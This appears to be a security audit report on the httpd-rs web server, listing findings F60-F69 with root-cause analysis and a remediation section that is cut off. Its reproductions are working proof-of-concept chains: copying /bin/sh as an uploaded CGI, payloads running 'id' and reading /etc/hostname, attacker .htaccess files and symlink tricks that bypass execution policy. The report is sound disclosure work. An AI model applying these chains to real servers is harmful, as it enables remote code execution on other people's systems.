# httpd-rs adversarial findings — Pass 10

**Target:** the repository commit `HEAD ebfd8a7`
(`Patch vulnerability`). F60 was built and reproduced from this commit before
a concurrent session left an in-progress F60 remediation in the main working
tree; F61-F69 were verified from a pristine detached worktree at the same
commit. The repository source was not modified for this pass; all fixtures
live under `/tmp/opencode/`.

**Environment:** Linux, loopback only. Apache 2.4.69 (Debian) was used as a
local differential oracle. No external network, real web server, or IP
address was involved.

**Status of this pass:** one new critical remote-code-execution class was
reproduced end to end, with five independently exercised variants. The pass-9
`F59ExplicitTargetAccessLayerTests` class still reports all five tests OK
(re-run during this pass); this shape is not covered.

**Additional independent findings:** F61-F66 are configuration
matcher/expression/handler bypasses and F67-F69 are rewrite/handler identity
execution bugs. They were reproduced against a pristine `HEAD ebfd8a7`
export/worktree, because a concurrent session left an in-progress F60
remediation in the main working tree. Several of them execute protected CGI
with ordinary HTTP and **no symlink, no upload, and no rewrite state**
(F61, F62, F63, F67, F68). They are independent of F60 and of each other.

* **F60 (Critical):** a resolved/canonical target reauthorization replaces
  the URL-mapped request scope with a scope computed only from the canonical
  filesystem path. The pass-9 fix preserved child `.htaccess` layers, but it
  did not preserve **configuration `<Directory>` policy** or **access-file
  layers in lexical ancestors above the mapping root**. A child
  `<Directory "/var/www/html/uploads"> Options -ExecCGI` (or an ancestor
  `/var/www/.htaccess Options -ExecCGI`) is therefore ignored when the
  document root or alias target is a symlink. The server-level
  `Options +ExecCGI` plus `AddHandler cgi-script .cgi` then executes an
  uploaded or pre-existing executable under the protected directory.
* **F60-A:** no `.htaccess` and no `AllowOverride` are needed. A plain
  `<Directory>` block is enough. Apache returns `403`; httpd-rs executes the
  script and returns `200`.
* **F60-E:** the mapping root need not be a deployment symlink. An
  attacker-created symlink **inside** the document root (for example from a
  ZIP/plugin/theme extraction or a file manager) to another uploaded file in
  a different in-root directory is enough. `openat2` permits the in-root
  symlink; the canonical target then loses the upload directory's
  `<Directory> Options -ExecCGI`. Apache returns `403`; httpd-rs executes.
* **F60-B:** an `.htaccess` in an ancestor **above** the symlinked mapping
  root is read by the initial plan (`--explain` shows `Options(2)`) but lost
  by the canonical-target plan. This shows the pass-9 F59 fix is incomplete
  even for the access-file layer it was meant to repair.
* **F60-C:** the same scope replacement drops `Options -Indexes` (directory
  listings reappear) and `RemoveHandler` (a `.cgi` file Apache serves as
  source is executed by httpd-rs). `Require`/authentication rules are still
  enforced by the pre-resolution grant, which is why the cleanest
  differential is execution/listing policy rather than a direct `Require`
  bypass.
* **F60-D:** the pass-9 layer walk is also fail-open for `AllowOverride`
  itself. A lexical `<Directory "/var/www/html"> AllowOverride None` on the
  URL-mapped root does not veto a canonical
  `<Directory "/srv/app/current/public"> AllowOverride All`. httpd-rs reads an
  attacker-supplied `.htaccess` in the canonical target even though Apache
  ignores it; with `Options +ExecCGI`/`AddHandler` in that `.htaccess` and an
  uploaded executable, this becomes a pure upload-to-RCE primitive with no
  server-level `ExecCGI`.

**Relationship to F59.** F59 was the symlinked-root `.htaccess` layer bug,
and the pass-9 fix does preserve that exact shape: the five
`F59ExplicitTargetAccessLayerTests` pass. F60 is the surviving scope
replacement above that fix. F60-A needs no `.htaccess` at all; F60-B shows
the layer walk still misses lexical ancestors above the mapping root; F60-D
shows the layer walk treats a lexical `AllowOverride None` as “keep the
canonical policy” instead of a denial. The common failure is that
`bind_target_grant()` substitutes the canonical target scope instead of
conjoining it with the URL-mapped scope.

---

## Findings at a glance

| ID | Severity | Area | Demonstrated impact | Preconditions |
|---|---|---|---|---|
| F60 / F60-A | Critical | resolved-target configuration scope | `<Directory> Options -ExecCGI` ignored; uploaded `/bin/sh` copy executes; pre-existing protected CGI executes | `DocumentRoot`/`Alias` mapping root contains a symlink; server-level or canonical-target `Options +ExecCGI`; `AddHandler cgi-script`; a lexical `<Directory>` (root or child) denies `ExecCGI`; executable file in that directory (upload/plugin primitive) or a pre-existing CGI to invoke |
| F60-E | Critical | in-root symlink target reauth | uploads a symlink inside the document root to another uploaded executable; upload directory's `<Directory> Options -ExecCGI` is lost; script executes while Apache 403 | same CGI host policy; attacker can create a symlink inside the docroot (ZIP/plugin/theme extraction or file manager) and an executable target in another in-root directory |
| F60-B | Critical | lexical ancestor access layer above symlinked root | ancestor `.htaccess Options -ExecCGI` ignored during target reauth; CGI executes while Apache 403 | same symlinked root plus an applicable `.htaccess` at a lexical ancestor above the mapping root (`AllowOverride` enabled there) |
| F60-C | High | target reauth Options/handler policy | `Options -Indexes` ignored; autoindex returns names Apache hides. `RemoveHandler .cgi` ignored; a file Apache serves as source executes as CGI | same symlinked root; no upload needed for the listing variant |
| F60-D | Critical | `AllowOverride` policy during target reauth | lexical `AllowOverride None` does not suppress canonical `AllowOverride All`; attacker `.htaccess` (`Options +ExecCGI`/`AddHandler`) is read and an uploaded script executes; Apache ignores the file and serves source | symlinked mapping root; lexical `<Directory>` `AllowOverride None`; canonical/real `<Directory>` `AllowOverride All`; upload of `.htaccess` plus executable, or a pre-existing canonical `.htaccess` that the operator expected the lexical policy to suppress |
| F61 | Critical | `<Location>` matching | shell-wildcard and `~regex` Location policies are inert; `<Location "/admin/*"> Require all denied` / `Options -ExecCGI` is bypassed; protected CGI executes | Apache-valid wildcard or regex Location used for security |
| F62 | Critical | `<Directory>` / `<Files>` glob | `[^...]` negation is inverted (treated as literal `^`); deny/Options applies to the opposite path set; protected CGI executes | Apache-valid shell-glob rule using `[^...]` |
| F63 | Critical | `<If>` / `RewriteCond expr` | missing `REQUEST_FILENAME`/`SCRIPT_FILENAME` variables and confined absolute file tests evaluate false; deny or `Options -ExecCGI` guarded by them is skipped; protected CGI executes | Apache-valid expression using an unimplemented variable or an absolute file test |
| F64 | Critical | `SetHandler` vs `AddHandler` | later `AddHandler` overrides inherited `SetHandler default-handler`; Apache serves source, httpd-rs executes CGI | same-block or child-scope AddHandler (including writable `.htaccess`) after a SetHandler deny |
| F65 | Critical | `ScriptAlias` handler override | scoped `SetHandler default-handler` ignored for ScriptAlias targets; Apache serves source, httpd-rs executes | ScriptAlias tree plus a per-directory/file/URL handler disable |
| F66 | Medium | `<DirectoryMatch>` trailing slash | `"/private/$"` misses the directory request; Apache 403, httpd-rs 200 autoindex | anchored DirectoryMatch used for directory policy |
| F67 | Critical | `[PT]` rewrite semantics | `[PT]` parsed but ignored; absolute substitution is executed as a host file instead of URL-mapped; protected PHP/CGI executes while Apache 404s | one Apache-valid `RewriteRule ... [PT,L]` with an absolute substitution under DocumentRoot; a PHP/CGI handler |
| F68 | Critical | rewrite filesystem override state | an earlier filesystem override is sticky across rewrite rounds; a later `[L]` URL rewrite is ignored and the earlier file executes | two rewrite rules: earlier absolute substitution with no `[L]`, later URL fallback with `[L]`; global handler |
| F69 | Critical | handler identity vs lexical filename | handler selected from canonical symlink target basename; a non-CGI URL executes `.php`/`.cgi` target and bypasses URL policy | in-root symlink with non-script name to a script; global AddHandler |

The common root cause is one identity split above the verified kernels, not a
break of URI normalization, `openat2`, the Verus path kernels, or the access
grant.

### Attacker model

* **Network:** ordinary HTTP/1.1 or HTTP/2 requests to the affected vhost;
  no malformed framing, race, cache state or local account is required.
* **For arbitrary command execution:** the attacker can place an executable
  file in the protected directory (ordinary upload/plugin/file-manager
  primitive) or invoke a pre-existing CGI that the policy was meant to
  disable. The uploaded script runs as the configured CGI user. A symlink
  created by archive/plugin extraction into the upload tree has the same
  effect as a deployment-level release symlink.
* **For F60-D:** the attacker can also place a `.htaccess` file in the
  canonical upload directory (or the directory already contains one that the
  lexical `AllowOverride None` was meant to suppress). The `.htaccess`
  supplies `Options +ExecCGI` and `AddHandler`; no server-level `ExecCGI` is
  needed.
* **What still holds:** lexical `Require all denied`, Basic auth and
  method/`AllowMethods` restrictions are enforced by the pre-resolution
  grant. A request that the initial URL scope denies never reaches the
  target. This is an execution/list policy bypass, not a `Require` bypass.

---

## Top exploit chain

### 1. F60-A — symlinked DocumentRoot + `<Directory> Options -ExecCGI` = arbitrary command execution

This is the deployment shape used by release symlinks, Docker image layouts
and shared-hosting document roots:

```text
/srv/app/current/public          ← real files
/var/www/html -> /srv/app/current/public
```

The operator publishes the site through the symlink, enables CGI globally, and
then explicitly disables CGI in the uploads directory with a normal Apache
`<Directory>` block:

```apache
DocumentRoot "/var/www/html"
Options +ExecCGI +FollowSymLinks
AddHandler cgi-script .cgi

<Directory "/var/www/html">
    Require all granted
</Directory>

<Directory "/var/www/html/uploads">
    Options -ExecCGI
    Require all granted
</Directory>
```

No `.htaccess` file and no `AllowOverride` directive are involved. Apache
2.4.69 reads the lexical `<Directory>` rule and refuses the request with
`403 Options ExecCGI is off in this directory`. httpd-rs returns `200` and
executes the script.

A local proof uses an exact copy of `/bin/sh` as a stand-in for any uploaded
or deployed executable. The CGI POST body is the shell program:

```sh
mkdir -p /srv/app/current/public/uploads
cp /bin/sh /srv/app/current/public/uploads/sh.cgi
chmod 755 /srv/app/current/public/uploads/sh.cgi

printf "printf 'Content-Type: text/plain\r\n\r\n'; id; cat /etc/hostname\n" > /tmp/payload
```

Observed with the equivalent Apache and httpd-rs configurations:

```text
Apache : 403
httpd-rs: 200
uid=33(www-data) gid=33(www-data) groups=33(www-data)
debian
```

The diagnostic on httpd-rs shows that the initial plan is correct and still
contains the child rule:

```text
$ ./target/release/httpd-rs -f vp.conf --explain /uploads/sh.cgi --explain-method POST
  canonical_url_path: /uploads/sh.cgi
  document_root: /tmp/opencode/p10-poc/tree/www/html
  fs_path: /tmp/opencode/p10-poc/tree/www/html/uploads/sh.cgi
  matching_rules:
     Directory order=1 kind=Directory(".../www/html") nested=0
     Directory order=3 kind=Directory(".../www/html/uploads") nested=0
  options: Options(3)          # FollowSymLinks + Indexes; ExecCGI off
```

The actual request still executes. The initial `Options(3)` scope is discarded
when the canonical target is reauthorized.

A control run with the `<Directory "/var/www/html/uploads">` block removed
returns `200` from both servers, proving the `403` differential is caused by
the child `<Directory>` policy that httpd-rs loses.

### 2. F60-A/alias — the same bypass through a symlinked `Alias` target

A non-symlinked `DocumentRoot` with a symlinked alias target is enough:

```apache
DocumentRoot "/var/www/www"
Options +ExecCGI +FollowSymLinks
AddHandler cgi-script .cgi
Alias /up "/var/www/upload-link"     # /var/www/upload-link -> /srv/uploads

<Directory "/var/www/upload-link">
    Options -ExecCGI
    Require all granted
</Directory>
```

Request `POST /up/sh.cgi` with the shell body:

```text
Apache : 403
httpd-rs: 200
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The alias mapping root is the lexical symlink. The initial scope applies
`<Directory "/var/www/upload-link">`; the canonical target
`/srv/uploads/sh.cgi` re-evaluates only canonical `<Directory>` rules and
loses `-ExecCGI`.

### 2b. F60-E — attacker-created symlink inside an ordinary DocumentRoot

This variant needs no deployment-level symlink. The upload directory is
protected normally, and the attacker can create a symlink there (ZIP/tar
extraction, a plugin/theme installer, or a file manager). The symlink points
to another uploaded executable in a different directory inside the same
document root:

```text
/var/www/html/uploads/link.cgi -> ../payload/sh.cgi
```

Config as before:

```apache
DocumentRoot "/var/www/html"
Options +ExecCGI +FollowSymLinks
AddHandler cgi-script .cgi

<Directory "/var/www/html">
    Require all granted
</Directory>

<Directory "/var/www/html/uploads">
    Options -ExecCGI
    Require all granted
</Directory>
```

A direct request to `/uploads/link.cgi`:

```text
Apache : 403
httpd-rs: 200
INTREE-SYMLINK-RCE
```

`openat2(RESOLVE_BENEATH)` correctly allows the symlink because
`../payload/sh.cgi` remains under the document root. The opened target's
canonical path is `/var/www/html/payload/sh.cgi`; the target-scope
replacement applies `<Directory payload>`/global policy and loses the lexical
`<Directory uploads> Options -ExecCGI`. Apache applies the URL-mapped upload
directory policy and refuses.

A control with the `<Directory "/var/www/html/uploads">` block removed
returns `200` from both servers. This is the most attacker-friendly variant:
the only write primitive required is “create a symlink and an executable in
the web tree,” which is ordinary archive-extraction behavior in many PHP and
plugin ecosystems. The symlink target need not be attacker-uploaded either;
a pre-existing executable elsewhere in the document root works just as well.
For example, with `uploads/link.cgi -> ../cgi-bin/admin.cgi`, Apache returns
`403` and httpd-rs executes the existing administrative CGI (`200`), even
though the upload directory's policy forbids CGI.

### 3. F60-B — ancestor `.htaccess` above the symlinked mapping root

The pass-9 F59 patch reads child `.htaccess` layers from the canonical target.
It still ignores an access file in a lexical ancestor **above** the mapping
root because `mapped_policy_dir()` only translates canonical directories
*under* the root's canonical form.

Fixture:

```text
/tmp/opencode/p10anc/tree/www/.htaccess          Options -ExecCGI
/tmp/opencode/p10anc/tree/www/html -> ../real/public
/tmp/opencode/p10anc/tree/real/public/admin/run.cgi
```

with:

```apache
DocumentRoot "/tmp/opencode/p10anc/tree/www/html"
Options +ExecCGI +FollowSymLinks
AddHandler cgi-script .cgi

<Directory "/tmp/opencode/p10anc/tree/www">
    AllowOverride All
    Require all granted
</Directory>
```

`--explain` reads the ancestor `.htaccess` and reports `Options(2)` (ExecCGI
off):

```text
access_layers:
  dir=.../tree/www url_mount=.../tree/www/ subject=Some("html/admin/run.cgi")
access_file_trace:
  .../tree/www/.htaccess mode=All list=[] nonfatal=None rules=0
options: Options(2)
```

The request still executes:

```text
Apache : 403
httpd-rs: 200
PWNED-ANCESTOR-HTCESS
```

A control run with the `.htaccess` file removed returns `200` from both
servers. This is a direct follow-on to F59: the exact mechanism that preserves
`.htaccess` below the canonical root does not include the lexical ancestor
above the root, even though the initial F50 access walk does.

### 4. F60-C — listing and handler variants

The same scope replacement also loses:

* `Options -Indexes` in `<Directory "/var/www/html/list">`: Apache `403`,
  httpd-rs `200` with an autoindex body listing `wallet.dat`.
* `RemoveHandler .cgi` in `<Directory "/var/www/html/admin">`: Apache serves
  the script as source (`200` with `#!/bin/sh...`), httpd-rs executes it
  (`200` with command output).

These are the same root cause; they matter because `Options -Indexes` leaks
filenames and `RemoveHandler` is a common way to disable CGI/PHP in an upload
or plugin directory without disabling `ExecCGI` globally.

The same happens when the rule is on the mapping root itself. A minimal
configuration with only:

```apache
DocumentRoot "/var/www/html"          # symlink to /srv/app/current/public
Options +ExecCGI +FollowSymLinks
AddHandler cgi-script .cgi
<Directory "/var/www/html">
    Options -ExecCGI
    Require all granted
</Directory>
```

returns `403` from Apache and `200` with command output from httpd-rs for a
direct request to an executable under the root. The child-directory form is
used above only because it makes the intended “protect uploads” policy
obvious.

### 5. F60-D — lexical `AllowOverride None` does not veto canonical `AllowOverride All`

This is a separate fail-open branch in the pass-9 layer walk. The operator
hardens the URL-mapped document root but leaves the canonical release tree
override-enabled:

```apache
DocumentRoot "/var/www/html"          # symlink to /srv/app/current/public
Options +FollowSymLinks

<Directory "/var/www/html">
    AllowOverride None
    Require all granted
</Directory>

<Directory "/srv/app/current/public">
    AllowOverride All
    Require all granted
</Directory>
```

The attacker uploads both a `.htaccess` and a script into
`/srv/app/current/public/uploads`:

```apache
# uploads/.htaccess
Options +ExecCGI
AddHandler cgi-script .cgi
```

```sh
# uploads/sh.cgi
#!/bin/sh
printf 'Content-Type: text/plain\r\n\r\nUPLOADED-HTCESS-RCE\n'
```

Apache applies `<Directory "/var/www/html"> AllowOverride None` to the lexical
URL path, ignores `uploads/.htaccess`, and serves the script as source. httpd-rs
reads the canonical target `.htaccess`, applies `Options +ExecCGI` and
`AddHandler`, and executes it:

```text
Apache : 200  #!/bin/sh
         # printf 'Content-Type: text/plain\r\n\r\nUPLOADED-HTCESS-RCE\n'
httpd-rs: 200
         UPLOADED-HTCESS-RCE
```

A control with `<Directory "/srv/app/current/public"> AllowOverride None`
makes both servers serve the source, proving the canonical
`AllowOverride All` is the switch that opens the fail-open branch. A second
control with `<Directory "/var/www/html"> AllowOverride All` makes both
servers execute, confirming that the lexical `None` is the denial httpd-rs
fails to enforce.

The same differential works when only the upload directory is denied:
`<Directory "/var/www/html/uploads"> AllowOverride None` with the canonical
root still `AllowOverride All`. Apache serves the uploaded script as source;
httpd-rs applies the canonical root override and executes it. This is the more
focused hardening shape: the operator disables overrides exactly where
attacker uploads land.

The code path is explicit:

```rust
// crates/server/src/htaccess.rs:411-417
let mut dir_scope = cfg.effective_scope_cached(vhost, &dir, url_path);
if let Some(mapped) = mapped_dir.as_deref().filter(|mapped| *mapped != dir) {
    let mapped_scope = cfg.effective_scope_cached(vhost, mapped, url_path);
    if mapped_scope.override_policy.is_enabled() {
        dir_scope = mapped_scope;
    }
}
```

When the lexical mapped scope is `AllowOverride None`, `is_enabled()` is
false, so the canonical scope is kept and its `.htaccess` is read. The mapped
policy must be able to **deny** override, not only replace an enabled policy.
This is a fail-open gate in the F59 layer walk.

---

## Additional independent findings (F61-F69)

These were reproduced against a pristine `HEAD ebfd8a7` export/worktree with
Apache 2.4.69 on loopback. They do not depend on the F60 patch, and most do
not require a symlink or an upload. The exact fixtures are under
`/tmp/opencode/`; the clean HEAD binary used for final verification is
`/tmp/opencode/httpd-rs-head/target/release/httpd-rs` (SHA-256
`ce9a53d905d9122675acde6fea446baec6cb9910573e62e40ae2a9d15aa1cfde`).

### F61. Critical: `<Location>` wildcards and `~regex` form are inert

Apache supports shell-wildcard `<Location>` patterns and the
`<Location ~ "regex">` form. httpd-rs stores the entire argument as a literal
prefix and never expands wildcards or parses the `~` form
(`config.rs:4850-4863`; definition `config.rs:1319-1327`).

```apache
DocumentRoot "/tmp/opencode/locwild2/www"
Options +ExecCGI
AddHandler cgi-script .cgi
<Directory "/tmp/opencode/locwild2/www">
    Require all granted
</Directory>
<Location "/admin/*">
    Require all denied
</Location>
```

Request `GET /admin/sh.cgi`:

```text
Apache  : 403
httpd-rs : 200 EXECUTED
```

The same bypass works for `<Location "/admin/*"> Options -ExecCGI`,
`<Location ~ "^/admin/"> Options -ExecCGI`, and
`<Location "/admin/*"> SetHandler default-handler`. Protected static files
under the wildcard are also served. Removing the `<Location>` block makes
both servers execute, confirming causality. No symlink, upload, or rewrite
is involved. **Confidence: high.**

### F62. Critical: shell-glob `[^...]` negation is inverted

Apache treats both `[!a]` and `[^a]` as negated character classes. httpd-rs's
`glob_match()` only recognizes `!`; a leading `^` is treated as a literal
class member (`config.rs:2153-2185`). `files_glob_to_regex()` explicitly
escapes a leading `^` (`config.rs:5236-5265`), so `<Files>` is inverted too.

```apache
DocumentRoot "/tmp/opencode/dirglobneg/www"
Options +ExecCGI
AddHandler cgi-script .cgi
<Directory "/tmp/opencode/dirglobneg/www/[^a]*">
    Require all denied
</Directory>
```

```text
/zdir/z.txt   Apache 403, httpd-rs 200
/adir/a.txt   Apache 200, httpd-rs 403
/zdir/sh.cgi  Apache 403, httpd-rs 200 "Z-EXECUTED"
/adir/sh.cgi  Apache 200, httpd-rs 403
```

`<Files "[^a]*"> Require all denied` has the same inversion. The control
`[!a]` makes both servers agree exactly. No symlink/upload required.
**Confidence: high.**

### F63. Critical: `<If>` / `RewriteCond expr` fail open on missing variables and confined file tests

`expr::var()` does not implement Apache's `REQUEST_FILENAME` or
`SCRIPT_FILENAME`, and returns an error (`expr.rs:300-305`). `<If>` and
`RewriteCond expr` discard that error as false (`config.rs:4735-4738`,
`rewrite.rs:662-665`). Absolute file tests are rejected by
`confined_expr_path()` (`expr.rs:430-449`) even in main-configuration `<If>`.

```apache
<Directory "/tmp/opencode/ifvar4/www">
    Require all granted
    <If "%{REQUEST_FILENAME} =~ /private/">
        Options -ExecCGI
    </If>
</Directory>
```

```text
GET /private/sh.cgi
Apache  : 403
httpd-rs : 200 EXECUTED
```

The same is reproduced with `<If "%{REQUEST_FILENAME} =~ /private/">
Require all denied`, top-level `SCRIPT_FILENAME`, and
`RewriteCond expr "%{REQUEST_FILENAME} =~ /secret/"` + `[F]`. The
main-configuration absolute test `<If "-f '/tmp/opencode/ifabs/maintenance.flag'">
Require all denied` also fails false in httpd-rs when the flag exists outside
DocumentRoot, while Apache honors it. `%{REQUEST_URI}` in the same position
is enforced by both, and removing the `<If>` block restores execution.
**Confidence: high** for the missing-variable and rewrite forms; the absolute
`-f` form is a real differential but sits on the deliberate F45 confinement
boundary.

### F64. Critical: later `AddHandler` overrides inherited `SetHandler`

`SetHandler` is stored as a wildcard `Handler::add("*", value)` entry
(`config.rs:3667-3671`), and `AddHandler` appends extension entries
(`config.rs:3640-3657`). `effective_handler()` scans the merged list in
reverse and returns the last match (`config.rs:725-748`). Apache keeps
`SetHandler` as a separate override with precedence over `AddHandler`.

```apache
<Directory "/tmp/opencode/seth4/www/uploads">
    SetHandler default-handler
    AddHandler cgi-script .cgi
</Directory>
```

```text
GET /uploads/sh.cgi
Apache  : 200 source "#!/bin/sh..."
httpd-rs : 200 EXECUTED
```

A more security-relevant variant uses a parent
`SetHandler default-handler`, `AllowOverride FileInfo`, and an attacker
`.htaccess` containing `AddHandler cgi-script .cgi`; Apache serves source,
httpd-rs executes. Removing `SetHandler` makes both execute. **Confidence:
high.**

### F65. Critical: `ScriptAlias` ignores scoped `SetHandler default-handler`

`cgi::is_cgi()` returns true immediately for any ScriptAlias target before
consulting the effective handler (`cgi.rs:1211-1218`), and the dispatcher
uses that result (`server.rs:2459-2460`).

```apache
ScriptAlias /cgi-bin/ "/tmp/opencode/sa_seth/www/cgi-bin/"
<Directory "/tmp/opencode/sa_seth/www/cgi-bin">
    SetHandler default-handler
    Require all granted
</Directory>
```

```text
GET /cgi-bin/sh.cgi
Apache  : 200 source "#!/bin/sh..."
httpd-rs : 200 EXECUTED
```

The same bypass works with `<Files "sh.cgi"> SetHandler default-handler` and
`<Location "/cgi-bin/ok.cgi"> SetHandler default-handler`; removing the
handler override makes both execute. **Confidence: high.**

### F66. Medium: `<DirectoryMatch>` `$` misses trailing-slash directory requests

`apply_directory_match_rules()` matches the regex against a directory
`fs_path` without a trailing slash (`config.rs:10419`; `request_plan.rs`
builds the directory target without one). Apache matches directory requests
with the trailing slash.

```apache
Options +Indexes
<DirectoryMatch "/private/$">
    Require all denied
</DirectoryMatch>
```

```text
GET /private/
Apache  : 403
httpd-rs : 200 autoindex listing
```

The listing can expose directory contents; with `DirectoryIndex index.cgi`
the index may be served where Apache denies the directory URL. This is an
information/policy bypass rather than a standalone unique execution
primitive, because the index script may also be directly reachable under the
same config. **Confidence: high on the divergence; medium on standalone
execution relevance.**

### F67. Critical: `[PT]` is parsed but ignored; absolute rewrite substitutions execute host files

`RewriteFlags::passthrough` is set by the parser (`config.rs:639`,
`config.rs:5498`) but never read. `rewrite::process()` treats any absolute
substitution as a filesystem override without checking `[PT]`
(`rewrite.rs:524-552`). The dispatcher then replaces the target and executes
the file (`server.rs:2135-2189`, `server.rs:2460-2466`, `:2493`, `:2511`).

```apache
DocumentRoot "/tmp/opencode/p11-pt/www"
<FilesMatch "\.php$">
    SetHandler "proxy:unix:/run/php/php8.4-fpm.sock|fcgi://localhost"
</FilesMatch>
<Location "/secret">
    Require all denied
</Location>
RewriteEngine On
RewriteRule "^/app/(.*)$" "%{DOCUMENT_ROOT}/$1" [PT,L]
```

Request `GET /app/secret/secret.php`:

```text
Apache  : 404 Not Found
httpd-rs : 200 P11-PT-PHP-RCE uid=33
direct GET /secret/secret.php: 403 on both
```

The CGI form with `Options +ExecCGI` / `AddHandler cgi-script .cgi` gives
Apache `404`, httpd-rs `200 P11-PT-CGI-RCE uid=33`. Apache passes the
substitution through URL mapping (`$DOCUMENT_ROOT/tmp/...`) and finds
nothing; httpd-rs executes the host file. No symlink or upload required.
**Confidence: high.**

### F68. Critical: filesystem override is sticky across rewrite rounds

`filesystem_override` is initialized once per `process()` (`rewrite.rs:321`)
and only replaced when a later rule produces another filesystem candidate
(`rewrite.rs:550-552`). It is never cleared when a later rule changes the URL
to a non-filesystem target; the last value is returned at `rewrite.rs:599-606`
and applied at `server.rs:2135-2189`.

```apache
RewriteEngine On
RewriteRule "^/app/(.*)$" "%{DOCUMENT_ROOT}/$1"
RewriteRule "^" "/index.html" [L]
AddHandler "proxy:unix:/run/php/php8.4-fpm.sock|fcgi://localhost" .php
```

Request `GET /app/secret/secret.php`:

```text
Apache  : 200 INDEX-PAGE
httpd-rs : 200 P11-STICKY-ADD-PHP-RCE uid=33
direct GET /secret/secret.php: 403 on both
```

The CGI variant (global `Options +ExecCGI` + `AddHandler cgi-script .cgi`)
gives Apache `200 INDEX-PAGE`, httpd-rs `200 DOCROOT-STICKY-RCE`. A control
with the second rule removed returns the script output from both servers,
confirming the later `[L]` fallback is what should have won. No symlink or
upload required. **Confidence: high.**

### F69. Critical: handler selection uses the canonical symlink target's basename

`fd_path()` canonicalizes the opened file (`files.rs:47-49`), and handler
selection uses `actual_path.file_name()` rather than the lexical request
filename (`server.rs:2408-2418`, `:2493`, `:2511`;
`fastcgi.rs:398-413`; `cgi.rs:1211-1222`). The target scope is evaluated with
the original URL, so a `<Location>` deny on the real script URL is not
applied.

```apache
AddHandler "proxy:unix:/run/php/php8.4-fpm.sock|fcgi://localhost" .php
<Location "/secret">
    Require all denied
</Location>
```

```text
www/public/link.txt -> ../secret/secret.php
```

```text
GET /public/link.txt
Apache  : 200 source of secret.php
httpd-rs : 200 P11-B-ADD-PHP-RCE uid=33
direct GET /secret/secret.php: 403 on both
```

The CGI variant `public/link.txt -> ../secret/secret.cgi` with
`AddHandler cgi-script .cgi` gives Apache source, httpd-rs
`SYMLINK-CGI-RAN`. This requires an in-root symlink (deployment or
attacker-created); unlike F60-E it does not depend on a `<Directory>
Options -ExecCGI` loss: both lexical and canonical `<Directory>` scopes
allow execution, but the handler identity and URL policy are wrong.
**Confidence: high for execution; symlink precondition.**

---

## Root cause

### The initial plan is correct

`dispatch_inner()` builds the initial plan from the URL mapping. For a
symlinked document root the plan's `fs_path` is lexical:

```rust
// crates/server/src/request_plan.rs
let fs_path = root.join(&rel);          // lexical root, possibly a symlink
```

The initial `plan.evaluate_scope()` therefore applies every `<Directory>`,
`<DirectoryMatch>` and ancestor access-file rule that matches the URL-mapped
path. This is what `--explain` prints.

### Opening the target discovers a second path identity

The dispatcher opens the file normally:

```rust
// crates/server/src/server.rs
match resolve_target_checked(&root, &rel, follow, owner_match_only) {
    Target::File { file, meta } => {
        let actual_path = crate::files::fd_path(&file).unwrap_or_else(|| fs_path.clone());
        let (target_grant, target_resource, target_scope) = match bind_target_grant(
            cfg, vhost, &scope, &grant, &fs_path, &actual_path, &root, ...
        ) ...
```

`fd_path()` returns the kernel's canonical path through every symlink. When
the mapping root is a symlink, `actual_path != fs_path`. The same is true for
any in-root symlink that points to a different in-root path (F60-E):
`openat2` correctly permits the link, but the canonical target's lexical
spelling differs from the requested URL-mapped path.

### `bind_target_grant()` replaces the scope instead of conjoining it

```rust
// crates/server/src/server.rs:1390
fn bind_target_grant(...) -> Result<(AccessGrant, ResourceKey, Scope), Response> {
    if actual_path == fs_path {
        ... // keep the initial scope
    }

    let (mut target_scope, config_conditionals, htaccess_conditionals) =
        evaluate_scope_for_path(cfg, vhost, actual_path, url_path, req, peer, mapping_root) ...;

    ...
    Ok((bound, key, target_scope))
}
```

`evaluate_scope_for_path()` (`crates/server/src/server.rs:1346`) builds a
fresh `RequestPlan::from_fs_target()` for the canonical path and evaluates it.
The returned `target_scope` is used directly:

```rust
// crates/server/src/server.rs:2403
let scope = &target_scope;
let grant = &target_grant;
```

Handler selection and serving then consume only that scope:

```rust
// crates/server/src/server.rs:2459
if cgi::is_cgi(cfg, scope, name, script_alias) {
    return run_cgi(... scope, grant, resource ...);
}
```

There is no merge with the original URL-mapped `scope`. The initial scope was
used for the pre-resolution grant check (which enforces `Require`,
`AllowMethods`, authentication and method limits), so ACLs still deny. But
`Options`, handler maps, MIME policy and similar post-resolution policy are
taken only from the canonical target.

### Why F59's patch does not cover this

The pass-9 fix changed `RequestPlan::from_fs_target()` to collect access-file
layers from the explicit target:

```rust
// crates/server/src/request_plan.rs:265
fn build_with_fs_path(...) {
    let layers = crate::htaccess::collect_layers_with_root(
        cfg, vhost, &fs_path, &target.url_path, Some(&root),
    )?;
    ...
    Self::evaluate_scope() // consumes self.layers
}
```

That repairs **child `.htaccess` files below the canonical root** (F59). It
does not repair:

1. **Configuration `<Directory>`/`<DirectoryMatch>` effects** on the
   URL-mapped lexical path. `effective_scope_with_layers()` starts from
   `cfg.effective_scope_req_base_deferred(vhost, fs_path, ...)` and applies
   `apply_directory_rules_for_dir()` only to canonical ancestors. The lexical
   `<Directory>` delta is never merged.
2. **Lexical ancestors above the mapping root.** `mapped_policy_dir()` maps a
   canonical directory `D` to a lexical directory only when
   `D.strip_prefix(canonical_root)` succeeds. A lexical ancestor such as
   `/var/www` above `/var/www/html -> /srv/.../public` has no canonical
   descendant relationship, so its `.htaccess` is not added to the target
   layer set. Even if it were added, `effective_scope_with_layers()` only
   applies layers whose `identity.dir` is in the canonical `dirs` list.

The configuration-variant F60-A is completely independent of `.htaccess` and
`AllowOverride`; it fails even with `AllowOverride None`.

### The initial grant does not enforce Options

Before target resolution, the dispatcher calls `helper_access_response()` with
the initial scope. That enforces authorization and methods, not execution
policy. Consequently:

* A lexical `<Directory> Require all denied`/Basic auth still blocks (we
  verified `403`/`401`), so the finding is not a direct `Require` bypass.
* A lexical `<Directory> Options -ExecCGI` does not block, because the
  execution decision is made later with the replaced target scope.

This is the same shape reported in F59 for `.htaccess Options -ExecCGI`, but
the surviving configuration/ancestor cases show the scope replacement itself
was never fixed.

---

## Remediation

1. **Never replace the URL-mapped security scope with the canonical-target
   scope.** A resolved target may add restrictions, but it must not remove
   the policy attached to the URL that the client requested. Compute the
   target scope and then conjoin it with the original scope:
   * `Options`: intersect the positive permission bits (`ExecCGI`, `Indexes`,
     `FollowSymLinks`, ...). A request may execute only if **both** the
     lexical URL scope and the canonical target scope grant execution.
   * handler maps: a `RemoveHandler`/`SetHandler none` in either scope must
     remain effective; `AddHandler` in the target scope cannot override a
     lexical removal.
   * authorization/auth: require both grants (or keep the current
